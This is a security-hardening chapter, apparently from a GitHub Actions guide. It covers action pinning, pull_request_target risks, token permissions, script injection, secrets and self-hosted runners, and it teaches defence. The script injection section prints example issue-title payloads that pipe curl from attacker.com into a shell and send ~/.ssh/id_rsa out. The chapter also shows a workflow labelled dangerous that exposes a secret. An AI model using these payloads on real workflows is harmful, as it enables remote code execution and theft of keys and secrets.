# Chapter 18: Security Hardening

A workflow file is code. It runs on GitHub's infrastructure, has access to repository secrets, and in many cases can push code, create releases, or deploy to production environments. A poorly written workflow can be exploited by attackers to steal secrets, run arbitrary code, or take control of a deployment pipeline.

This chapter covers the common attack surfaces in GitHub Actions workflows and the practices that eliminate them.

## Action Version Pinning

### The Risk of Mutable Tags

When you reference an action using a tag like `@v4`, that tag is a Git reference. The action author can move the tag to point to a different commit at any time. This means a workflow that was secure yesterday can run different code today if the action author updated the `v4` tag.

A malicious actor who gains access to an action author's account can push new code under an existing version tag. Every workflow using that action will run the malicious code on its next execution.

### Pinning to a Commit SHA

The safe approach is to pin the action to a specific commit SHA. A SHA is immutable. Once a commit exists, its hash never changes. An attacker who moves a tag does not affect SHA-pinned workflows.

```yaml
# Mutable tag: can change at any time
- uses: actions/checkout@v4

# Immutable SHA pin: this exact commit, forever
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

The SHA corresponds to a specific version, which you document in a comment. Tools like `dependabot` or `Renovate` can keep SHA pins up to date automatically by opening pull requests when new versions are released.

### When to Pin

Pin all third-party actions (any action not in the `actions/` organization) in production workflows. For actions in the `actions/` organization (GitHub's own), the risk is lower because GitHub controls them, but pinning is still good practice.

## The `pull_request_target` Trigger

### Why This Trigger Is Dangerous

`pull_request_target` runs the workflow code from the **base branch** (the branch being merged into), not from the pull request branch. This means the workflow has access to secrets, even for pull requests from forks.

The intended use case is labeling pull requests, posting comments, or running code checks that need repository write access. It is designed for maintainers who need to automate PR management.

The danger: if a `pull_request_target` workflow also checks out the pull request code and runs it, the attacker controls the code being executed with full access to your repository secrets.

```yaml
# DANGEROUS: checks out the PR code and runs it with secrets access
on: pull_request_target

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # PR branch code
      - run: npm test   # Attacker controls this code
        env:
          API_KEY: ${{ secrets.API_KEY }}   # Secret is exposed
```

### Safe Pattern for `pull_request_target`

If you need `pull_request_target` for its write access, do not check out or execute code from the pull request branch.

```yaml
# Safe: uses base branch code only, interacts with PR via API
on: pull_request_target

jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - uses: actions/labeler@v5
        with:
          repo-token: ${{ secrets.GITHUB_TOKEN }}
          # This action only reads PR metadata, not the PR code
```

For CI testing of fork pull requests, use the standard `pull_request` event instead. Fork PRs triggered by `pull_request` run without access to secrets, which is the correct behavior.

## Least-Privilege Permissions

### Setting Minimum Required Permissions

By default, GitHub gives `GITHUB_TOKEN` either read-only or read-write access depending on the repository's settings. To prevent a compromised step from having more access than it needs, declare the minimum permissions explicitly in every workflow.

```yaml
# At the top of the workflow, restrict everything to read-only
permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test

  publish:
    runs-on: ubuntu-latest
    permissions:
      contents: write        # Only this job gets write access
      packages: write
    steps:
      - run: npm publish
```

The `permissions: {}` block at the workflow level sets all permissions to none, and individual jobs can then request only what they need.

### Principle of Least Privilege in Practice

When configuring a workflow, ask: what is the minimum `GITHUB_TOKEN` permission this job needs? If the job only clones the repository and runs tests, `contents: read` is sufficient. If it creates a release, it needs `contents: write`. If it posts a PR comment, it needs `pull-requests: write`.

## Preventing Script Injection

### How Script Injection Works

When a `${{ }}` expression is placed directly inside a `run:` block, the value is inserted into the shell script as a literal string before the script runs. If the value contains shell metacharacters, the shell interprets them as commands.

```yaml
# Vulnerable: if the issue title contains $(curl http://attacker.com | sh), 
# that command executes with the runner's full permissions
- run: echo "Processing issue: ${{ github.event.issue.title }}"
```

An attacker can open an issue with a title like `` `curl http://attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)` `` and the command executes during any workflow that passes the title through an expression directly to a shell.

### The Safe Pattern

Assign the expression value to an environment variable, then reference the environment variable in the shell command. Environment variable expansion does not interpret the value as a command.

```yaml
# Safe: the value is the content of ISSUE_TITLE, not a command
- env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: echo "Processing issue: $ISSUE_TITLE"
```

This pattern applies to all user-controlled values: issue titles, PR bodies, branch names from external forks, commit messages, and any event payload field that users can influence.

## Third-Party Action Vetting

Before adding a third-party action to a workflow, evaluate it:

**Check the action source:** Read the `action.yml` file and any scripts it calls. Understand what the action does and what permissions it requests.

**Check the publisher:** Actions from known organizations (AWS, Azure, Google, Docker, HashiCorp) carry implicit trust because they are maintained by the companies whose services they wrap. Unknown publishers require more scrutiny.

**Check the star count and release history:** An action with one release, zero stars, and a recent creation date is higher risk than one with years of releases and community adoption.

**Use allowlists:** Organizations on GitHub Enterprise can restrict which actions are allowed to run in their repositories. This is configured in the organization settings under Actions.

## Secrets Management Best Practices

**Never print secrets in logs:** GitHub masks known secret values, but masks can be circumvented by formatting secrets as base64, splitting them across multiple echo statements, or other transformations.

```yaml
# Even if GitHub masks it, do not do this
- run: echo "Token: ${{ secrets.API_TOKEN }}"

# Pass secrets via environment variables to scripts
- env:
    API_TOKEN: ${{ secrets.API_TOKEN }}
  run: ./deploy.sh    # Script reads $API_TOKEN internally
```

**Rotate secrets after suspected exposure:** If a workflow log might have leaked a secret, rotate it immediately. The GitHub UI has no way to retroactively delete log content from third-party integrations that may have already copied the log.

**Use OIDC for cloud authentication instead of stored credentials:** See [Chapter 15](15-permissions-and-github-token.md). Static credentials stored as secrets have an indefinite lifetime. OIDC-derived credentials expire automatically after each run.

**Scope secrets to environments:** Store production credentials in the `production` environment with required reviewers. This prevents a pull request workflow from accessing production secrets, because only jobs targeting the `production` environment can read them, and that environment requires explicit approval.

## Securing Self-Hosted Runners

**Never use self-hosted runners on public repositories without protection rules.** Any external contributor can open a pull request against a public repository, which by default triggers workflows. If those workflows run on your self-hosted runner, the contributor's code runs on your infrastructure.

If you must use self-hosted runners on a public repository, configure the runner to only accept jobs from specific branches using runner group policies, or require manual approval for all external contributors by configuring the "Fork pull request workflows" setting to require approval.

**Use ephemeral self-hosted runners.** Instead of a persistent runner that accumulates state between runs, configure runners that are destroyed and recreated after each job. Tools like `actions-runner-controller` on Kubernetes automate this pattern. Ephemeral runners prevent one job's environment from affecting the next job's environment.
